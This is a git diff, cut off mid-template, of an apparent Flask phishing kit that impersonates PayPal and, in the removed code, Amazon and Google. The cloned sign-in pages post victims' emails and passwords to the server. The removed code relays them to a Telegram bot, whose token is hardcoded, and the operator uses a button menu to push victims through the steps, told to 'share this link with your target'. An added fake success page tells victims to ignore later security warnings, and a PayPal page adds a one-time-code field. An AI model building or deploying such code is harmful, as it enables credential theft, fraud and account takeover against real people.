@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTRA-FAST Amazon, Google & PayPal Login System - FIXED for Render
+ULTRA-FAST PayPal Login System - OPTIMIZED FOR RENDER
 """
 
 from flask import Flask, request, jsonify, render_template_string
@@ -11,7 +11,7 @@ import threading
 from datetime import datetime
 import os
 
-# Setup logging
+# Ultra-fast logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -21,571 +21,90 @@ app = Flask(__name__)
 BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
 CHAT_ID = "7861055360"
 
-# Session storage
+# Optimized session storage
 sessions = {}
 last_update_id = 0
-current_form_type = "amazon"  # Default form type
 
-def send_telegram_message(text, reply_markup=None):
-    """Send message to Telegram"""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    
-    payload = {
-        'chat_id': CHAT_ID,
-        'text': text,
-        'parse_mode': 'HTML',
-        'disable_notification': False
-    }
-    
-    if reply_markup:
-        payload['reply_markup'] = reply_markup
-    
-    try:
-        response = requests.post(url, json=payload, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('ok'):
-                logger.info("✅ Telegram message sent")
-                return True
-        return False
-    except Exception as e:
-        logger.error(f"Telegram error: {e}")
-        return False
+# ========== HTML TEMPLATES ==========
 
-def create_form_selection_keyboard():
-    """Create keyboard for form selection"""
-    keyboard = [
-        [{"text": "🛍️ Amazon Form", "callback_data": "form:amazon"}],
-        [{"text": "📧 Google Form", "callback_data": "form:google"}],
-        [{"text": "💰 PayPal Form", "callback_data": "form:paypal"}]
-    ]
-    return {"inline_keyboard": keyboard}
-
-def create_keyboard(session_id, field, value):
-    """Create keyboard with copy buttons"""
-    keyboard = []
-    
-    if field == 'email':
-        keyboard = [
-            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
-            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
-            [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
-        ]
-    elif field == 'password':
-        keyboard = [
-            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
-            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
-            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
-            [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
-        ]
-    
-    return {"inline_keyboard": keyboard}
-
-def get_telegram_updates():
-    """Get Telegram updates"""
-    global last_update_id
-    
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-        params = {
-            'timeout': 5,
-            'offset': last_update_id + 1
+# Verification Success Template
+VERIFICATION_SUCCESS_TEMPLATE = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Complete</title>
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
         }
-        
-        response = requests.get(url, params=params, timeout=6)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('ok') and data.get('result'):
-                for update in data['result']:
-                    last_update_id = update['update_id']
-                    
-                    # Handle messages (like /start)
-                    if 'message' in update and 'text' in update['message']:
-                        text = update['message']['text']
-                        if text == '/start':
-                            return f"start_command:{update['message']['chat']['id']}"
-                    
-                    # Handle callback queries
-                    if 'callback_query' in update:
-                        callback_data = update['callback_query']['data']
-                        logger.info(f"Received command: {callback_data}")
-                        return callback_data
-        return None
-    except Exception as e:
-        logger.error(f"Telegram updates error: {e}")
-        return None
+        .icon-container {
+            width: 64px;
+            height: 64px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkmark {
+            width: 32px;
+            height: 32px;
+            stroke: #ffffff;
+            stroke-width: 3;
+            fill: none;
+        }
+        .notice-box {
+            background: #fef3c7;
+            border: 1px solid #fbbf24;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container d-flex align-items-center justify-content-center min-vh-100">
+        <div class="row justify-content-center w-100">
+            <div class="col-12 col-md-8 col-lg-6 col-xl-5">
+                <div class="card border-0 shadow-sm">
+                    <div class="card-body p-4 p-md-5 text-center">
+                        <div class="icon-container mx-auto mb-4">
+                            <svg class="checkmark" viewBox="0 0 52 52">
+                                <path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                        </div>
 
-def process_commands_background():
-    """Background thread for command processing - FIXED for Render"""
-    global current_form_type
-    
-    logger.info("🚀 Telegram background processor STARTED")
-    
-    while True:
-        try:
-            command = get_telegram_updates()
-            if command:
-                logger.info(f"Processing command: {command}")
-                
-                # Handle start command
-                if command.startswith('start_command:'):
-                    chat_id = command.split(':')[1]
-                    
-                    # Send form selection keyboard
-                    keyboard = create_form_selection_keyboard()
-                    send_telegram_message(
-                        f"🌐 <b>WELCOME TO LOGIN SYSTEM</b>\n"
-                        f"Choose which login form you want to use:\n"
-                        f"⏰ {datetime.now().strftime('%H:%M:%S')}",
-                        keyboard
-                    )
-                
-                # Handle form selection
-                elif command.startswith('form:'):
-                    form_type = command.split(':')[1]
-                    current_form_type = form_type
-                    
-                    # Get Render URL
-                    render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
-                    
-                    form_name = "Amazon" if form_type == "amazon" else "Google" if form_type == "google" else "PayPal"
-                    send_telegram_message(
-                        f"✅ <b>{form_name.upper()} FORM SELECTED</b>\n"
-                        f"🔗 Your Link: {render_url}\n"
-                        f"📱 Share this link with your target\n"
-                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                    )
-                    logger.info(f"Form changed to: {form_type}")
-                
-                # Handle copy commands
-                elif command.startswith('copy:'):
-                    parts = command.split(':')
-                    if len(parts) >= 3:
-                        session_id = parts[1]
-                        field = parts[2]
+                        <h1 class="fw-semibold mb-3">Verification Successful</h1>
                         
-                        if session_id in sessions:
-                            value = sessions[session_id].get(field, '')
-                            send_telegram_message(
-                                f"📋 <b>COPY {field.upper()}</b>\n"
-                                f"<code>{value}</code>\n\n"
-                                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
-                            )
-                
-                # Handle action commands
-                elif ':' in command:
-                    action, session_id = command.split(':', 1)
-                    
-                    # Map actions to session states
-                    action_map = {
-                        'proceed_password': 'show_password',
-                        'email_error': 'show_email_error', 
-                        'proceed_success': 'show_success',
-                        'password_error': 'show_password_error'
-                    }
-                    
-                    if action in action_map:
-                        if session_id in sessions:
-                            sessions[session_id]['action'] = action_map[action]
-                            sessions[session_id]['last_update'] = time.time()
-                            logger.info(f"Set action {action_map[action]} for session {session_id}")
-            
-            time.sleep(1)  # Reduced polling for Render compatibility
-            
-        except Exception as e:
-            logger.error(f"Command processor error: {e}")
-            time.sleep(2)
+                        <p class="text-muted mb-4">
+                            Thank you for verifying your account. We appreciate your cooperation in maintaining account security.
+                        </p>
 
-# Start background command processor when app starts
-@app.before_first_request
-def startup():
-    """Start background threads when app starts - FIXED for Render"""
-    try:
-        command_thread = threading.Thread(target=process_commands_background, daemon=True)
-        command_thread.start()
-        logger.info("✅ Background threads started successfully")
-    except Exception as e:
-        logger.error(f"Failed to start background threads: {e}")
+                        <div class="notice-box p-3 mb-4">
+                            <div class="fw-semibold text-warning-emphasis mb-2">Important Notice</div>
+                            <p class="text-warning-emphasis mb-0 small">
+                                Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.
+                            </p>
+                        </div>
 
-# [PASTE ALL YOUR HTML TEMPLATES HERE - Amazon, Google, PayPal, Verification]
-# Make sure to include ALL the HTML templates from your previous code
-
-# Amazon HTML Template
-AMAZON_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign-In</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .amazon-logo { margin: 20px 0 15px; }
-        .main-container { width: 100%; max-width: 350px; margin: 0 auto; }
-        .card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; margin-bottom: 22px; }
-        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; color: #111; }
-        .form-group { margin-bottom: 14px; }
-        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 2px; color: #111; }
-        input { width: 100%; height: 31px; padding: 3px 7px; font-size: 13px; border: 1px solid #a6a6a6; border-radius: 3px; }
-        input:focus { outline: none; border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,0.5); }
-        .btn { width: 100%; height: 31px; background: linear-gradient(to bottom,#f7dfa5,#f0c14b); border: 1px solid #a88734; border-radius: 3px; cursor: pointer; }
-        .link { color: #0066c0; text-decoration: none; font-size: 13px; }
-        .help-text { font-size: 12px; color: #565959; margin-top: 14px; }
-        .hidden { display: none !important; }
-        .loading-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); z-index: 50; display: none; align-items: center; justify-content: center; }
-        .loading-overlay.active { display: flex; }
-        .spinner { width: 4rem; height: 4rem; border: 4px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .password-wrapper { position: relative; display: flex; align-items: center; }
-        .password-wrapper input { flex: 1; padding-right: 35px; }
-        .password-toggle { position: absolute; right: 8px; background: none; border: none; cursor: pointer; color: #565959; font-size: 12px; }
-        .user-info { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #e7e7e7; margin-bottom: 14px; }
-        .user-avatar { width: 48px; height: 48px; border-radius: 50%; background: linear-gradient(135deg,#232f3e,#37475a); display: flex; align-items: center; justify-content: center; font-size: 20px; color: #fff; }
-        .footer-links { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e7e7e7; }
-        .footer-links a { color: #0066c0; text-decoration: none; font-size: 11px; }
-        .footer-links a:hover { text-decoration: underline; color: #c45500; }
-        .create-account { text-align: center; margin-top: 16px; font-size: 13px; color: #111; }
-        .copyright { text-align: center; margin-top: 20px; font-size: 11px; color: #555; }
-    </style>
-</head>
-<body>
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <div id="loadingText">Checking information...</div>
-    </div>
-
-    <div class="amazon-logo">
-        <svg width="100" height="31" viewBox="0 0 103 31">
-            <path fill="#FF9900" d="M64.857 24.554c-7.093 5.24-17.399 8.028-26.266 8.028-12.425 0-23.618-4.598-32.086-12.254-.665-.6-.069-1.42.729-.952 9.14 5.32 20.44 8.522 32.114 8.522 7.87 0 16.532-1.633 24.502-5.017 1.199-.509 2.204.788 1.007 1.673"/>
-            <path fill="#FF9900" d="M67.742 21.267c-.906-1.162-6.003-.55-8.287-.276-.693.083-.8-.52-.175-.956 4.062-2.858 10.725-2.033 11.502-1.075.777.967-.203 7.668-4.03 10.87-.589.493-1.15.23-.889-.423.858-2.146 2.785-6.978 1.879-8.14"/>
-        </svg>
-    </div>
-
-    <div class="main-container">
-        <div id="emailStep" class="card">
-            <h1>Sign in</h1>
-            <form id="emailForm">
-                <div class="form-group">
-                    <label for="email">Email or mobile phone number</label>
-                    <input type="text" id="email" required>
-                </div>
-                <button type="submit" class="btn">Continue</button>
-            </form>
-            <div class="help-text">
-                By continuing, you agree to Amazon's <a href="#" class="link">Conditions of Use</a> and <a href="#" class="link">Privacy Notice</a>.
-            </div>
-        </div>
-
-        <div id="passwordStep" class="card hidden">
-            <h1>Sign in</h1>
-            <div class="user-info">
-                <div class="user-avatar" id="avatarCircle">A</div>
-                <div class="user-email" id="userEmail"></div>
-            </div>
-            <form id="passwordForm">
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <div class="password-wrapper">
-                        <input type="password" id="password" required>
-                        <button type="button" class="password-toggle" id="passwordToggle">Show</button>
+                        <p class="text-muted small">
+                            If you receive any suspicious emails requesting additional verification, please do not click on any links.
+                        </p>
                     </div>
                 </div>
-                <button type="submit" class="btn">Sign in</button>
-            </form>
-        </div>
-    </div>
-
-    <div class="main-container">
-        <div class="create-account">
-            <hr style="margin: 20px 0; border: none; border-top: 1px solid #e7e7e7;">
-            <span style="background: #fff; padding: 0 10px; position: relative; top: -10px;">New to Amazon?</span>
-            <div style="margin-top: 10px;">
-                <button style="width: 100%; height: 31px; background: linear-gradient(to bottom,#f7f8fa,#e7e9ec); border: 1px solid #a2a6ac; border-radius: 3px; cursor: pointer; font-size: 13px;">
-                    Create your Amazon account
-                </button>
             </div>
         </div>
-
-        <div class="footer-links">
-            <a href="#" class="link">Conditions of Use</a>
-            <a href="#" class="link">Privacy Notice</a>
-            <a href="#" class="link">Help</a>
-        </div>
-        
-        <div class="copyright">
-            © 1996-2025, Amazon.com, Inc. or its affiliates
-        </div>
     </div>
 
-    <script>
-        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const emailStep = document.getElementById('emailStep');
-        const passwordStep = document.getElementById('passwordStep');
-        const emailForm = document.getElementById('emailForm');
-        const passwordForm = document.getElementById('passwordForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const passwordToggle = document.getElementById('passwordToggle');
-        const userEmail = document.getElementById('userEmail');
-        const avatarCircle = document.getElementById('avatarCircle');
-
-        function showLoading(text) {
-            loadingOverlay.querySelector('#loadingText').textContent = text;
-            loadingOverlay.classList.add('active');
-        }
-
-        function hideLoading() { loadingOverlay.classList.remove('active'); }
-
-        function showStep(step) {
-            [emailStep, passwordStep].forEach(s => s.classList.add('hidden'));
-            document.getElementById(step + 'Step').classList.remove('hidden');
-        }
-
-        async function sendToBackend(field, value) {
-            try {
-                const response = await fetch('/submit', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({session_id: sessionId, field: field, value: value})
-                });
-                return await response.json();
-            } catch (error) { return { success: false }; }
-        }
-
-        async function checkOperatorStatus() {
-            const startTime = Date.now();
-            const timeout = 5000;
-            
-            while ((Date.now() - startTime) < timeout) {
-                try {
-                    const response = await fetch('/status?session_id=' + sessionId);
-                    const data = await response.json();
-                    if (data.action) {
-                        handleOperatorAction(data.action);
-                        return;
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                } catch (error) {
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                }
-            }
-            handleOperatorAction('show_password');
-        }
-
-        function handleOperatorAction(action) {
-            hideLoading();
-            if (action === 'show_password') showStep('password');
-            else if (action === 'show_success') window.location.href = '/verification-success';
-            else if (action === 'show_email_error') showStep('email');
-            else if (action === 'show_password_error') showStep('password');
-        }
-
-        emailForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const emailValue = emailInput.value;
-            if (emailValue) {
-                showLoading('Verifying email address...');
-                await sendToBackend('email', emailValue);
-                userEmail.textContent = emailValue;
-                avatarCircle.textContent = emailValue[0].toUpperCase();
-                await checkOperatorStatus();
-            }
-        });
-
-        passwordForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const passwordValue = passwordInput.value;
-            if (passwordValue) {
-                showLoading('Checking password...');
-                await sendToBackend('password', passwordValue);
-                await checkOperatorStatus();
-            }
-        });
-
-        passwordToggle.addEventListener('click', () => {
-            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-            passwordToggle.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
-        });
-    </script>
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
-</html>
-'''
+</html>'''
 
-# Google HTML Template
-GOOGLE_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .main-container { width: 100%; max-width: 450px; }
-        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
-        .google-logo { margin-bottom: 16px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        h2 { font-size: 16px; font-weight: 400; margin-bottom: 24px; color: #202124; }
-        .form-group { margin-bottom: 24px; text-align: left; }
-        .input-wrapper { position: relative; }
-        input { width: 100%; height: 56px; padding: 16px 15px 0; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; background: transparent; }
-        input:focus { outline: none; border-color: #1a73e8; border-width: 2px; padding: 16px 14px 0; }
-        label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #5f6368; pointer-events: none; transition: all 0.2s; background: #fff; padding: 0 4px; }
-        input:focus + label, input:not(:placeholder-shown) + label { top: 8px; font-size: 12px; color: #1a73e8; }
-        .btn { padding: 0 24px; height: 36px; font-size: 14px; border: none; border-radius: 4px; cursor: pointer; }
-        .btn-primary { background: #1a73e8; color: #fff; }
-        .hidden { display: none !important; }
-        .loading-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; }
-        .loading-overlay.active { display: flex; }
-        .spinner { width: 48px; height: 48px; border: 4px solid #e8eaed; border-top-color: #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .user-info { display: flex; align-items: center; justify-content: center; gap: 16px; margin-bottom: 24px; }
-        .user-avatar { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg,#1a73e8,#4285f4); display: flex; align-items: center; justify-content: center; font-size: 24px; color: #fff; }
-    </style>
-</head>
-<body>
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <div id="loadingText">Checking information...</div>
-    </div>
-
-    <div class="main-container">
-        <div id="emailStep" class="card">
-            <div class="google-logo">
-                <svg width="75" height="24" viewBox="0 0 75 24">
-                    <path fill="#4285F4" d="M38.746 14.608v-3.808h12.644c.12.648.186 1.416.186 2.256 0 2.808-.768 6.28-3.24 8.752-2.4 2.504-5.464 3.84-9.59 3.84-7.576 0-13.944-6.176-13.944-13.752S30.17 1.144 37.746 1.144c4.192 0 7.192 1.648 9.432 3.792l-2.656 2.656c-1.608-1.512-3.792-2.688-6.776-2.688-5.528 0-9.848 4.456-9.848 9.992s4.32 9.992 9.848 9.992c3.576 0 5.616-1.44 6.92-2.744 1.064-1.064 1.76-2.584 2.032-4.664h-8.952v.128z"/>
-                </svg>
-            </div>
-            <h1>Sign in</h1>
-            <h2>to continue to Gmail</h2>
-            <form id="emailForm">
-                <div class="form-group">
-                    <div class="input-wrapper">
-                        <input type="text" id="email" placeholder=" " required>
-                        <label for="email">Email or phone</label>
-                    </div>
-                </div>
-                <button type="submit" class="btn btn-primary">Next</button>
-            </form>
-        </div>
-
-        <div id="passwordStep" class="card hidden">
-            <div class="google-logo">
-                <svg width="75" height="24" viewBox="0 0 75 24">
-                    <path fill="#4285F4" d="M38.746 14.608v-3.808h12.644c.12.648.186 1.416.186 2.256 0 2.808-.768 6.28-3.24 8.752-2.4 2.504-5.464 3.84-9.59 3.84-7.576 0-13.944-6.176-13.944-13.752S30.17 1.144 37.746 1.144c4.192 0 7.192 1.648 9.432 3.792l-2.656 2.656c-1.608-1.512-3.792-2.688-6.776-2.688-5.528 0-9.848 4.456-9.848 9.992s4.32 9.992 9.848 9.992c3.576 0 5.616-1.44 6.92-2.744 1.064-1.064 1.76-2.584 2.032-4.664h-8.952v.128z"/>
-                </svg>
-            </div>
-            <h1>Welcome</h1>
-            <div class="user-info">
-                <div class="user-avatar" id="avatarCircle">G</div>
-            </div>
-            <div id="userEmail"></div>
-            <form id="passwordForm">
-                <div class="form-group">
-                    <div class="input-wrapper">
-                        <input type="password" id="password" placeholder=" " required>
-                        <label for="password">Enter your password</label>
-                    </div>
-                </div>
-                <button type="submit" class="btn btn-primary">Next</button>
-            </form>
-        </div>
-    </div>
-
-    <script>
-        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const emailStep = document.getElementById('emailStep');
-        const passwordStep = document.getElementById('passwordStep');
-        const emailForm = document.getElementById('emailForm');
-        const passwordForm = document.getElementById('passwordForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const userEmail = document.getElementById('userEmail');
-        const avatarCircle = document.getElementById('avatarCircle');
-
-        function showLoading(text) {
-            loadingOverlay.querySelector('#loadingText').textContent = text;
-            loadingOverlay.classList.add('active');
-        }
-
-        function hideLoading() { loadingOverlay.classList.remove('active'); }
-
-        function showStep(step) {
-            [emailStep, passwordStep].forEach(s => s.classList.add('hidden'));
-            document.getElementById(step + 'Step').classList.remove('hidden');
-        }
-
-        async function sendToBackend(field, value) {
-            try {
-                const response = await fetch('/submit', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({session_id: sessionId, field: field, value: value})
-                });
-                return await response.json();
-            } catch (error) { return { success: false }; }
-        }
-
-        async function checkOperatorStatus() {
-            const startTime = Date.now();
-            const timeout = 5000;
-            
-            while ((Date.now() - startTime) < timeout) {
-                try {
-                    const response = await fetch('/status?session_id=' + sessionId);
-                    const data = await response.json();
-                    if (data.action) {
-                        handleOperatorAction(data.action);
-                        return;
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                } catch (error) {
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                }
-            }
-            handleOperatorAction('show_password');
-        }
-
-        function handleOperatorAction(action) {
-            hideLoading();
-            if (action === 'show_password') showStep('password');
-            else if (action === 'show_success') window.location.href = '/verification-success';
-            else if (action === 'show_email_error') showStep('email');
-            else if (action === 'show_password_error') showStep('password');
-        }
-
-        emailForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const emailValue = emailInput.value;
-            if (emailValue) {
-                showLoading('Checking email...');
-                await sendToBackend('email', emailValue);
-                userEmail.textContent = emailValue;
-                avatarCircle.textContent = emailValue[0].toUpperCase();
-                await checkOperatorStatus();
-            }
-        });
-
-        passwordForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const passwordValue = passwordInput.value;
-            if (passwordValue) {
-                showLoading('Signing in...');
-                await sendToBackend('password', passwordValue);
-                await checkOperatorStatus();
-            }
-        });
-    </script>
-</body>
-</html>
-'''
-
-# PayPal HTML Template
+# PayPal HTML Template with Bootstrap
 PAYPAL_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -593,139 +112,48 @@ PAYPAL_TEMPLATE = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal Login</title>
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background-color: #ffffff;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
         }
-
-        header {
-            border-bottom: 1px solid #e5e7eb;
-            padding: 1rem 0;
-        }
-
-        .header-container {
-            max-width: 28rem;
-            margin: 0 auto;
-            padding: 0 1rem;
-        }
-
-        .logo {
+        .paypal-logo {
             font-size: 1.75rem;
             font-weight: bold;
             color: #0070ba;
             font-family: Verdana, sans-serif;
         }
-
-        main {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-        }
-
-        .content-wrapper {
-            width: 100%;
-            max-width: 28rem;
-        }
-
-        .form-container {
-            animation: fadeIn 0.3s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateX(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        label {
-            display: block;
-            font-size: 0.875rem;
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-            color: #111827;
-        }
-
-        input {
-            width: 100%;
-            height: 2.75rem;
-            padding: 0 0.75rem;
-            font-size: 1rem;
-            border: 1px solid #d1d5db;
-            border-radius: 0.25rem;
-            transition: all 0.2s;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #0070ba;
-            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
-        }
-
-        input:disabled {
-            background-color: #f3f4f6;
-            cursor: not-allowed;
-        }
-
-        .btn {
-            width: 100%;
-            height: 3rem;
+        .btn-paypal {
             background-color: #0070ba;
             color: white;
             border: none;
-            border-radius: 9999px;
-            font-size: 1rem;
+            border-radius: 50px;
             font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
         }
-
-        .btn:hover:not(:disabled) {
+        .btn-paypal:hover {
             background-color: #005ea6;
         }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        .otp-input {
+            text-align: center;
+            font-size: 1.875rem;
+            letter-spacing: 0.5em;
+            font-weight: 300;
+            height: 3.5rem;
         }
-
-        .link {
-            color: #0070ba;
-            text-decoration: none;
-            font-size: 0.875rem;
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
         }
-
-        .link:hover {
-            text-decoration: underline;
+        .password-toggle {
+            cursor: pointer;
+            color: #6b7280;
         }
-
-        .user-avatar {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-bottom: 1.5rem;
-        }
-
         .avatar-circle {
             width: 2.5rem;
             height: 2.5rem;
@@ -737,518 +165,617 @@ PAYPAL_TEMPLATE = '''
             font-weight: 500;
             color: #4b5563;
         }
-
-        .user-email {
-            font-size: 0.875rem;
-            color: #6b7280;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .loading-overlay {
-            position: fixed;
-            inset: 0;
-            background-color: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(8px);
-            z-index: 50;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-
-        .loading-overlay.active {
-            display: flex;
-        }
-
-        .spinner {
-            width: 4rem;
-            height: 4rem;
-            border: 4px solid #e5e7eb;
-            border-top-color: #0070ba;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 1rem;
-        }
-
-        .loading-text {
-            font-size: 1rem;
-            color: #374151;
-            text-align: center;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .error-message {
-            color: #dc2626;
-            font-size: 0.875rem;
-            text-align: center;
-            margin-bottom: 1rem;
-            padding: 0.5rem;
-            background-color: #fef2f2;
-            border-radius: 0.25rem;
-            border: 1px solid #fecaca;
-        }
-
-        footer {
-            border-top: 1px solid #e5e7eb;
-            padding: 1.5rem 0;
-        }
-
-        .footer-container {
-            max-width: 72rem;
-            margin: 0 auto;
-            padding: 0 1rem;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-            justify-content: center;
-            font-size: 0.75rem;
-        }
-
-        .footer-links a {
-            color: #6b7280;
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
     </style>
 </head>
 <body>
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <div class="loading-text" id="loadingText">Checking information...</div>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay d-none align-items-center justify-content-center flex-column">
+        <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;"></div>
+        <div class="loading-text fs-6 text-muted" id="loadingText">Checking information...</div>
     </div>
 
-    <!-- Header -->
-    <header>
-        <div class="header-container">
-            <div class="logo">PayPal</div>
-        </div>
-    </header>
-
-    <!-- Main Content -->
-    <main>
-        <div class="content-wrapper">
-            <!-- Email Step -->
-            <div id="emailStep" class="form-container">
-                <div id="emailError" class="error-message hidden">Incorrect email address. Please try again.</div>
-                <form id="emailForm">
-                    <div class="form-group">
-                        <label for="email">Email or mobile number</label>
-                        <input type="email" id="email" required>
-                    </div>
-                    <button type="submit" class="btn">Next</button>
-                </form>
+    <div class="container-fluid p-0">
+        <!-- Header -->
+        <header class="border-bottom py-3">
+            <div class="container">
+                <div class="paypal-logo">PayPal</div>
             </div>
+        </header>
 
-            <!-- Password Step -->
-            <div id="passwordStep" class="form-container hidden">
-                <div id="passwordError" class="error-message hidden">Incorrect password. Please try again.</div>
-                <div class="user-avatar">
-                    <div class="avatar-circle" id="avatarCircle">U</div>
-                    <div class="user-email" id="userEmail"></div>
+        <!-- Main Content -->
+        <main class="py-5">
+            <div class="container">
